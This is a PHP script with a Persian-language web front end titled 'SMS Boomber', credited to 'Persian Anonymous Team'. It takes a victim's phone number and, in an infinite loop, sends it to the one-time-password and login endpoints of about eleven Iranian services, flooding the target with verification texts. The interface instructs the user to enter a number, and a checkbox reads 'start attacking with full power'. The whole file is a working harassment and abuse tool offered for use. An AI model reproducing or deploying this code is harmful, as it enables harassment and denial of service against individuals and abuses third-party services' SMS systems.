<?php
set_time_limit(10000);
if (isset($_GET['target'])) {
	$target = $_GET['target'];
	while (True) {

        $url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp';
        $ch = curl_init($url);
        $payload = json_encode(array("cellphone" => "+98".$target));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$result = curl_exec($ch);
        curl_close($ch);
        // 00000000000000000000000000000000000000000000 //
        $url2 = 'https://tap33.me/api/v2/user';
		$ch2 = curl_init($url2);
		$payload2 = '{"credential":{"phoneNumber":"0'.$target.'","role":"PASSENGER"}}';
		curl_setopt($ch2, CURLOPT_POSTFIELDS, $payload2);
		curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
		$result2 = curl_exec($ch2);
        curl_close($ch2);
         // 00000000000000000000000000000000000000000000 //
		$url3 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
		$ch3 = curl_init($url3);
		$payload3 = '{phoneNumber: "0'.$target.'"}';
		curl_setopt($ch3, CURLOPT_POSTFIELDS, $payload3);
		curl_setopt($ch3, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
		$result3 = curl_exec($ch3);
        curl_close($ch3);
        // 00000000000000000000000000000000000000000000 //
		$url4 = 'https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/';
		$params = [
			'phone_number' => '0'.$target
		];
		$ch4 = curl_init($url4);
		$parameters = http_build_query($params);
		curl_setopt($ch4, CURLOPT_POST, true);
		curl_setopt($ch4, CURLOPT_POSTFIELDS, $parameters);
		curl_setopt($ch4, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch4);
		curl_close($ch4);
		// 00000000000000000000000000000000000000000000 //
		$url5 = 'https://www.echarge.ir/m/login?length=19';
		$params5 = [
			'phoneNumber' => '0'.$target
		];
		$ch5 = curl_init($url5);
		$parameters5 = http_build_query($params5);
		curl_setopt($ch5, CURLOPT_POST, true);
		curl_setopt($ch5, CURLOPT_POSTFIELDS, $parameters5);
		curl_setopt($ch5, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch5);
		curl_close($ch5);
		// 00000000000000000000000000000000000000000000 //
		$url6 = 'https://api.divar.ir/v5/auth/authenticate';
		$ch6 = curl_init($url6);
		$payload6 = '{"phone":"'.$target.'"}';
		curl_setopt($ch6, CURLOPT_POSTFIELDS, $payload6);
		curl_setopt($ch6, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch6, CURLOPT_RETURNTRANSFER, true);
		$result6 = curl_exec($ch6);
		curl_close($ch6);
		// 00000000000000000000000000000000000000000000 //
		$url7 = 'https://www.alopark.com/driver/Login/Register';
		$params7 = [
			'Mobile' => '0'.$target
		];
		$ch7 = curl_init($url7);
		$parameters7 = http_build_query($params7);
		curl_setopt($ch7, CURLOPT_POST, true);
		curl_setopt($ch7, CURLOPT_POSTFIELDS, $parameters7);
		curl_setopt($ch7, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch7);
		curl_close($ch7);
        // 00000000000000000000000000000000000000000000 //
		$url8 = 'https://base.darmankade.com/v1/PatientLogin';
		$ch8 = curl_init($url8);
		$payload8 = '{"Mobile":"0'.$target.'"}';
		curl_setopt($ch8, CURLOPT_POSTFIELDS, $payload8);
		curl_setopt($ch8, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch8, CURLOPT_RETURNTRANSFER, true);
		$result8 = curl_exec($ch8);
		curl_close($ch8);
        // 00000000000000000000000000000000000000000000 //
		$url9 = 'https://app.espard.com/api/v1/auth/identify-by-mobile';
		$ch9 = curl_init($url9);
		$payload9 = '{"data":{"mobile":"'.$target.'"},"oneSignalPlayerId":"","appVersion":"1.5.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1597042718355"}';
		curl_setopt($ch9, CURLOPT_POSTFIELDS, $payload9);
		curl_setopt($ch9, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch9, CURLOPT_RETURNTRANSFER, true);
		$result9 = curl_exec($ch9);
		curl_close($ch9);
        // 00000000000000000000000000000000000000000000 //
		$url10 = 'https://shadmessenger96.iranlms.ir/';
        $ch10 = curl_init($url10);
        $payload10 = json_encode(array("cellphone" => "+98".$target));
        curl_setopt($ch10, CURLOPT_POSTFIELDS, $payload10);
		curl_setopt($ch10, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch10, CURLOPT_RETURNTRANSFER, true);
		$result10 = curl_exec($ch10);
		curl_close($ch10);
		// 00000000000000000000000000000000000000000000 //
		$url11 = 'https://messengerg2c30.iranlms.ir/';
        $ch11 = curl_init($url11);
        $payload11 = json_encode(array("cellphone" => "+98".$target));
        curl_setopt($ch11, CURLOPT_POSTFIELDS, $payload11);
		curl_setopt($ch11, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		curl_setopt($ch11, CURLOPT_RETURNTRANSFER, true);
		$result11 = curl_exec($ch11);
        curl_close($ch11);
	}
	
}

?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <title>SMS Boomber</title>
</head>
<body>
    <img src="img/pexels-kat-wilcox-923681.jpg" alt="logo" class="logo rounded mx-auto d-block img-fluid">
    <br>
    <br>
    <br>
    <div class="rowin">
        <span class="per">Persian </span><span class="ano">  Anonymous  </span><span class="te"> Team</span>
    </div>
    <br>
    <br>
    <br>
	<br>
    <br>
	<br>
	<br>
	
	<div class="text-center">
		<p>نحوه استفاده :</p>
		<p> شماره تلفن را وارد کنید و روی دکمه ارسال کلیک کنید . تا زمانی که صفحه درحال لود شدن بود یعنی درحال ارسال پیامک هست. </p>
	</div>


    <div class="container col-md-6 offset-md-3">
        <form method="get" class="panel was-validated" dir="rtl">
            <div class="sh " >
                <label style="color:#ffa502;"> شماره تلفن مورد نظر</label>
                <input type="text" name="target" class="number form-control" placeholder="مثال : 93822212325" required>
                <small id="emailHelp" class="form-text text-muted">لطفا شماره را بدون 0 وارد کنید !!!</small>
            </div>
                <br>
            <div class="custom-control custom-checkbox mb-3 ">
              <input type="checkbox" class="custom-control-input" id="customControlValidation1" required>
                  <label class="custom-control-label" for="customControlValidation1">با تمام قدرت شروع کن به اتک زدن :)</label>
              <div class="invalid-feedback">لطفا تیک رو بزنید</div>
            </div>
                <br>
            <div class="col-md-auto sh">
                <button type="submit" class="btn btn-outline-danger bot">ارسال</button>
            </div>
        </form>
    </div>
    <br><br><br><br><br>
    <div class="rowin">
      <span class="rows">تهیه شده توسط </span>
      <p>Hidden</p>
    </div>
	<audio style="width:0%" controls  autoplay loop>
		<source src="0120-20Sohrab20MJ20-20Gangesh20Balas.mp3" type="audio/mp3" />
	</audio></br>
</body>
</html>
